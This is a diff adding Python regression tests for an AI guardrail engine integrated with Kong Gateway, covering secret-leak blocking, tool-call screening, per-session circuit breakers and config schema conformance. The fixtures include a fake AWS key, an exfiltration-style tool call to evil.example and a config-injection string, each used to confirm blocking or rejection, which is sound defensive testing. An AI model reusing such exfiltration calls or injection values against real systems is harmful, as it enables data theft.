@@ -28,6 +28,8 @@ def _kong_guard_prompt_lua_reference(request: dict, *, deny_patterns=(), allow_p
                                      match_all_roles: bool = False) -> tuple[bool, str]:
     """Faithful Python reference of Kong `kong/plugins/ai-prompt-guard/filters/guard-prompt.lua`
     (`execute(request, conf)` at commit `1c7a0aa714752a93b9a61779597b1de66063d3a6`).
+    Kong Gateway is Copyright 2016-2026 Kong Inc., Apache License 2.0; translated to Python and
+    simplified (regex errors and logging omitted; Python `re` stands in for PCRE). See NOTICE.
 
     Demonstrates the two structural properties addressed by `KongGuardrailEngine`:
       1. `match_all_roles=False` (default) skips `role="tool"` messages completely.
@@ -411,6 +413,167 @@ class TestKongGuardrailIntegration(unittest.TestCase):
                 mcp_up.shutdown()
                 mcp_up.server_close()
                 srv.close()
+
+
+class KongTemplateAndSessionTests(unittest.TestCase):
+    """Regression tests for the Kong config fixes of 2026-11-19.
+
+    Kong documents $(source), $(conf.params.*), $(content) and $(resp.*) for
+    ai-custom-guardrail. An undocumented variable reaches ADOM unrendered or empty, and must
+    neither hide the $(content) Kong did render nor become a shared session identity.
+    """
+
+    SECRET_TEXT = "Sure, here is the key: AKIAABCDEFGHIJKLMNOP"
+
+    def _engine(self, **kw) -> KongGuardrailEngine:
+        kw.setdefault("allowed_tools", ["read_ticket"])
+        kw.setdefault("approved_outbound", ["corp.com"])
+        return KongGuardrailEngine(**kw)
+
+    def test_content_text_screened_even_when_payload_unrendered_empty_or_request(self) -> None:
+        for payload in (None, "$(request)", "", "   ",
+                        json.dumps({"messages": [{"role": "user", "content": "hi"}]}),
+                        {"messages": [{"role": "user", "content": "hi"}]}):
+            v = self._engine().evaluate({"source": "OUTPUT", "text": self.SECRET_TEXT, "payload": payload})
+            self.assertTrue(v.block, payload)
+            self.assertTrue(any("secret_pattern" in s for s in v.signals), (payload, v.signals))
+
+    def test_structured_payload_tool_calls_screened_when_text_is_empty(self) -> None:
+        resp = {"choices": [{"message": {"content": None, "tool_calls": [{"function": {
+            "name": "post_data", "arguments": json.dumps({"url": "https://evil.example/x"})}}]}}]}
+        for payload in (resp, json.dumps(resp)):
+            v = self._engine().evaluate({"source": "OUTPUT", "text": "", "payload": payload})
+            self.assertTrue(v.block)
+            self.assertIn("post_data", v.blocked_tools)
+
+    def test_same_call_in_two_representations_is_screened_once(self) -> None:
+        call = {"tool_name": "read_ticket", "arguments": {"id": "T-1"}}
+        eng = self._engine()
+        v = eng.evaluate({"source": "OUTPUT", "session_id": "s-dup",
+                          "text": json.dumps(call), "payload": call})
+        self.assertFalse(v.block, v.signals)
+        self.assertEqual(eng.blast.state_of("s-dup"), "closed")
+
+    def test_unrendered_or_empty_session_values_are_not_an_identity(self) -> None:
+        eng = self._engine()
+        v = eng.evaluate({"source": "INPUT", "text": "hi", "session_id": "$(headers['x-session-id'])"},
+                         headers={"X-Session-Id": "$(headers['x-session-id'])",
+                                  "X-Consumer-Id": "$(consumer.id)", "X-Kong-Session-Id": "  "})
+        self.assertEqual(v.session_id, "default-kong-session")
+        self.assertIn("kong:session_unidentified", v.signals)
+        v = eng.evaluate({"source": "INPUT", "text": "hi"}, headers={"X-Consumer-Id": "consumer-42"})
+        self.assertEqual(v.session_id, "consumer-42")
+        self.assertNotIn("kong:session_unidentified", v.signals)
+
+    def test_unidentified_callers_do_not_share_a_breaker_or_budget(self) -> None:
+        eng = self._engine()
+        for _ in range(8):                                   # one caller trips repeatedly
+            v = eng.evaluate({"source": "OUTPUT", "text": self.SECRET_TEXT})
+            self.assertTrue(v.block)
+        v = eng.evaluate({"source": "INPUT", "text": "What's the weather in Boston?"})
+        self.assertFalse(v.block, v.block_message)          # a different caller is unaffected
+        for i in range(400):                                 # 200/min budget is not gateway-wide
+            v = eng.evaluate({"source": "INPUT" if i % 2 else "OUTPUT", "text": f"benign {i}"})
+            self.assertFalse(v.block, (i, v.block_message))
+
+    def test_identified_sessions_keep_the_breaker(self) -> None:
+        eng = self._engine()
+        for _ in range(6):
+            eng.evaluate({"source": "OUTPUT", "session_id": "agent-a", "text": self.SECRET_TEXT})
+        v = eng.evaluate({"source": "INPUT", "session_id": "agent-a", "text": "hello"})
+        self.assertTrue(v.block)
+        self.assertEqual(v.block_reason, "blast_radius_exceeded")
+        v = eng.evaluate({"source": "INPUT", "session_id": "agent-b", "text": "hello"})
+        self.assertFalse(v.block)
+
+    def test_anonymous_blast_radius_opt_in(self) -> None:
+        eng = self._engine(anonymous_blast_radius=True)
+        for _ in range(6):
+            eng.evaluate({"source": "OUTPUT", "text": self.SECRET_TEXT})
+        v = eng.evaluate({"source": "INPUT", "text": "hello"})
+        self.assertTrue(v.block)
+        self.assertEqual(v.block_reason, "blast_radius_exceeded")
+
+    def test_deck_uses_only_documented_variables(self) -> None:
+        import re
+        for scope in (None, "team-a"):
+            used = set(re.findall(r"\$\(([^)]*)\)", generate_deck_config(session_scope=scope)))
+            bad = {v for v in used if not (v in ("source", "content")
+                                           or v.startswith(("conf.params.", "resp.")))}
+            self.assertEqual(bad, set(), scope)
+        with self.assertRaises(ValueError):
+            generate_deck_config(session_scope='x" injected: "y')
+
+
+# Kong ai-custom-guardrail `config` schema (Kong Gateway 3.14-3.16), as published in the Konnect
+# provider's GatewayPluginAiCustomGuardrail reference (pulumi.com/registry/packages/konnect,
+# checked 2026-11-19). A real Konnect data plane rejected `metrics.block_details` with
+# "validation error: unknown field" (the field is `block_detail`); this keeps that from recurring.
+_KONG_GUARDRAIL_SCHEMA = {
+    "": {"guarding_mode", "text_source", "params", "request", "response", "functions", "metrics",
+         "custom_metrics", "allow_masking", "response_buffer_size", "ssl_verify",
+         "stop_on_error", "timeout"},
+    "request": {"url", "auth", "body", "headers", "queries"},
+    "response": {"block", "block_message"},
+    "metrics": {"block_detail", "block_reason", "masked"},
+}
+_FREE_MAPS = {"params", "functions", "custom_metrics", "request.body", "request.headers", "request.queries"}
+
+
+def _guardrail_config_keys(deck_yaml: str) -> list:
+    """(parent path, key) for every key under the ai-custom-guardrail plugin's `config:`."""
+    import re
+    lines = deck_yaml.splitlines()
+    start = next(i for i, l in enumerate(lines) if l.strip() == "- name: ai-custom-guardrail")
+    plugin_indent = len(lines[start]) - len(lines[start].lstrip())
+    out, stack, cfg_indent = [], [], None
+    for line in lines[start + 1:]:
+        if not line.strip() or line.lstrip().startswith("#"):
+            continue
+        indent = len(line) - len(line.lstrip())
+        if indent <= plugin_indent:
+            break                                            # next plugin or service
+        m = re.match(r"^\s*([A-Za-z_][\w-]*):", line)
+        if not m:
+            continue
+        key = m.group(1)
+        if cfg_indent is None:
+            if key == "config":
+                cfg_indent = indent
+            continue
+        if indent <= cfg_indent:
+            break
+        while stack and stack[-1][0] >= indent:
+            stack.pop()
+        parent = ".".join(k for _, k in stack)
+        out.append((parent, key))
+        stack.append((indent, key))
+    return out
+
+
+class KongSchemaConformanceTests(unittest.TestCase):
+    def test_generated_guardrail_config_uses_only_kong_schema_fields(self) -> None:
+        for scope in (None, "team-a"):
+            keys = _guardrail_config_keys(generate_deck_config(session_scope=scope))
+            self.assertTrue(keys)
+            for parent, key in keys:
+                if parent in _FREE_MAPS or any(parent.startswith(f + ".") for f in _FREE_MAPS):
+                    continue
+                self.assertIn(parent, _KONG_GUARDRAIL_SCHEMA, f"unexpected nesting {parent}.{key}")
+                self.assertIn(key, _KONG_GUARDRAIL_SCHEMA[parent], f"unknown Kong field {parent}.{key}".lstrip("."))
+
+    def test_fail_closed_options_are_explicit(self) -> None:
+        keys = set(_guardrail_config_keys(generate_deck_config()))
+        self.assertIn(("", "stop_on_error"), keys)
+        self.assertIn(("", "ssl_verify"), keys)
+        self.assertIn("stop_on_error: true", generate_deck_config())
+        self.assertIn("ssl_verify: true", generate_deck_config())
+
+    def test_schema_check_catches_the_real_failure(self) -> None:
+        bad = generate_deck_config().replace("block_detail:", "block_details:")
+        flagged = [(p, k) for p, k in _guardrail_config_keys(bad)
+                   if p == "metrics" and k not in _KONG_GUARDRAIL_SCHEMA["metrics"]]
+        self.assertEqual(flagged, [("metrics", "block_details")])
 
 
 if __name__ == "__main__":
